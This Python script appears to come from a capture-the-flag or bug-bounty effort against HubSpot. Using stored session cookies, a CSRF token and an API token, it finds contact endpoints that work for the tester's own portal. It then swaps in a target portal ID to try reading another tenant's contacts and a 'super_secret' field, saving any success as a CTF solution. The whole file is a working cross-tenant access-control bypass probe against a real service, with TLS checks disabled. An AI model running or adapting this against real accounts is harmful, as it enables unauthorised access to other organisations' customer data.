#!/usr/bin/env python3
"""
Find ANY working contact endpoint first, then try to modify it
"""

import requests
import json
import os
import urllib3
import re
from dotenv import load_dotenv

urllib3.disable_warnings()
load_dotenv()

SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
ACCESS_TOKEN = os.getenv('HUBSPOT_ACCESS_TOKEN')
TARGET_PORTAL = os.getenv('TARGET_PORTAL_ID', '46962361')
MY_PORTAL = os.getenv('MY_PORTAL_ID', '50708459')

csrf = re.search(r'hubspotapi-csrf=([^;]+)', SESSION_COOKIES).group(1) if 'hubspotapi-csrf=' in SESSION_COOKIES else ''

print("="*80)
print("Finding Working Contact Endpoint")
print("="*80)
print(f"\nStrategy: Find endpoint that works for OUR portal, then modify for target")
print(f"Our portal: {MY_PORTAL}")
print(f"Target portal: {TARGET_PORTAL}")
print("="*80)

# Comprehensive headers
headers_session = {
    'Cookie': SESSION_COOKIES,
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'application/json',
    'Referer': f'https://app.hubspot.com/contacts/{MY_PORTAL}/contact/1',
    'Origin': 'https://app.hubspot.com',
    'X-HubSpot-CSRF-hubspotapi': csrf,
}

headers_token = {
    'Authorization': f'Bearer {ACCESS_TOKEN}',
    'Content-Type': 'application/json',
}

# ============================================================================
# FIND WORKING ENDPOINT FOR OUR PORTAL
# ============================================================================

print("\n[*] Testing endpoints with OUR portal ({MY_PORTAL})...")

working_endpoints = []

our_portal_endpoints = [
    # Try with OUR portal
    f'https://api.hubapi.com/crm/v3/objects/contacts/1?portalId={MY_PORTAL}',
    f'https://api.hubapi.com/crm/v3/objects/contacts/1',  # No portalId
    f'https://app.hubspot.com/api/crm-objects/v1/objects/0-1/1?portalId={MY_PORTAL}',
    f'https://app.hubspot.com/api/contacts/v1/contact/vid/1?portalId={MY_PORTAL}',

    # Search for contacts in our portal
    f'https://api.hubapi.com/crm/v3/objects/contacts/search',
]

for url in our_portal_endpoints:
    print(f"\n  Testing: {url.split('.com')[1] if '.com' in url else url}")

    # Try with token
    try:
        if 'search' in url:
            payload = {
                'filterGroups': [],
                'properties': ['firstname', 'super_secret', 'email'],
                'limit': 1
            }
            r = requests.post(url, headers=headers_token, json=payload, verify=False, timeout=5)
        else:
            r = requests.get(url, headers=headers_token, verify=False, timeout=5)

        print(f"    Token auth: {r.status_code}")

        if r.status_code == 200:
            print(f"    *** WORKS WITH TOKEN! ***")
            try:
                data = r.json()
                print(f"    Data: {json.dumps(data, indent=2)[:300]}")

                working_endpoints.append({
                    'url': url,
                    'auth': 'token',
                    'method': 'POST' if 'search' in url else 'GET',
                    'data': data
                })

                # Check if we can see properties
                if 'properties' in str(data):
                    props = data.get('properties') or (data.get('results', [{}])[0].get('properties') if data.get('results') else {})
                    print(f"    Properties: {list(props.keys())[:10] if props else 'none'}")

            except Exception as e:
                print(f"    Error parsing: {e}")

    except Exception as e:
        print(f"    Error: {str(e)[:50]}")

    # Try with session
    try:
        if 'search' not in url:
            r2 = requests.get(url, headers=headers_session, verify=False, timeout=5)
            print(f"    Session auth: {r2.status_code}")

            if r2.status_code == 200:
                print(f"    *** WORKS WITH SESSION! ***")
                working_endpoints.append({
                    'url': url,
                    'auth': 'session',
                    'method': 'GET'
                })
    except:
        pass

# ============================================================================
# IF WE FOUND WORKING ENDPOINTS, TRY TO MODIFY FOR TARGET PORTAL
# ============================================================================

if working_endpoints:
    print(f"\n\n{'='*80}")
    print(f"Found {len(working_endpoints)} working endpoints!")
    print(f"{'='*80}")

    for endpoint in working_endpoints:
        print(f"\nWorking: {endpoint['url']}")
        print(f"Auth: {endpoint['auth']}")

        # Now try same endpoint with target portal
        target_url = endpoint['url'].replace(MY_PORTAL, TARGET_PORTAL)

        print(f"\n  Trying with target portal: {target_url.split('.com')[1] if '.com' in target_url else target_url}")

        try:
            headers = headers_token if endpoint['auth'] == 'token' else headers_session

            if endpoint['method'] == 'POST':
                payload = {
                    'filterGroups': [],
                    'properties': ['firstname', 'super_secret', 'email'],
                    'limit': 1,
                    'portalId': TARGET_PORTAL
                }
                r = requests.post(target_url, headers=headers, json=payload, verify=False, timeout=5)
            else:
                r = requests.get(target_url, headers=headers, verify=False, timeout=5)

            print(f"  Status: {r.status_code}")

            if r.status_code == 200:
                print(f"\n  ========================================")
                print(f"  *** SUCCESS WITH TARGET PORTAL! ***")
                print(f"  ========================================")

                try:
                    data = r.json()
                    print(json.dumps(data, indent=2))

                    if 'super_secret' in json.dumps(data).lower():
                        print(f"\n  *** CTF FLAG FOUND! ***")

                        with open('/home/user/Hub/findings/CTF_SOLUTION.json', 'w') as f:
                            json.dump({
                                'url': target_url,
                                'auth': endpoint['auth'],
                                'data': data
                            }, f, indent=2)

                except Exception as e:
                    print(f"  Response: {r.text[:500]}")

        except Exception as e:
            print(f"  Error: {str(e)[:100]}")

else:
    print(f"\n\nNo working endpoints found for our own portal.")
    print("This suggests the API access token might not have correct scopes.")
    print("\nLet me try one more thing - check if we can list ANY contacts...")

    # Try to list contacts from our own portal
    list_url = f'https://api.hubapi.com/crm/v3/objects/contacts?limit=10'

    try:
        r = requests.get(list_url, headers=headers_token, verify=False, timeout=10)
        print(f"\nList contacts (our portal): {r.status_code}")

        if r.status_code == 200:
            data = r.json()
            print(f"Response: {json.dumps(data, indent=2)[:500]}")

            # Now try with target portal param
            r2 = requests.get(f'{list_url}&portalId={TARGET_PORTAL}', headers=headers_token, verify=False, timeout=10)
            print(f"\nList contacts (target portal): {r2.status_code}")

            if r2.status_code == 200:
                print("*** SUCCESS ***")
                print(r2.text[:1000])

    except Exception as e:
        print(f"Error: {e}")

print("\n" + "="*80)
print("Endpoint Discovery Complete")
print("="*80)
